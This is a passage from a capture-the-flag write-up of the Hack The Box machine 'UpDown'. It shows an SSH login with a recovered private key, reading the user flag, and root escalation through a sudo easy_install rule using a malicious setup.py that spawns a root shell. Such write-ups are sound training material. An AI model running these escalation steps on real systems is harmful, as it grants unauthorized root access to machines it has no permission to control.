  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
Welcome to 'siteisup.htb' application
```

Let's use it:
```console
┌─[evyatar9@parrot]─[/hackthebox/UpDown]
└──╼ $ ssh -i idrsa_developer developer@siteisup.htb 
The authenticity of host 'siteisup.htb (10.10.11.177)' can't be established.
ECDSA key fingerprint is SHA256:npwXkHj+pLo3LaYR66HNCKEpU/vUoTG03FL41SMlIh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'siteisup.htb,10.10.11.177' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov 19 19:37:18 UTC 2022

  System load:           0.0
  Usage of /:            49.9% of 2.84GB
  Memory usage:          24%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.177
  IPv6 address for eth0: dead:beef::250:56ff:feb9:882b

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36
developer@updown:~$ cat user.txt
e3499c902e868bf70b2b829daeaee5ac
```

And we get the user flag ```e3499c902e868bf70b2b829daeaee5ac```.

### Root

By running ```sudo -l``` we can see the following:
```console
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

So we can get root using the following command [Reference](https://gtfobins.github.io/gtfobins/easy_install/):
```console
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.P2MqUrlft3
Writing /tmp/tmp.P2MqUrlft3/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.P2MqUrlft3/egg-dist-tmp-M3XAmH
# whoami
root
# cat /root/root.txt
fd6802b8d25cf8a31e37f84976eac032
#
```

And we get the root flag ```fd6802b8d25cf8a31e37f84976eac032```.
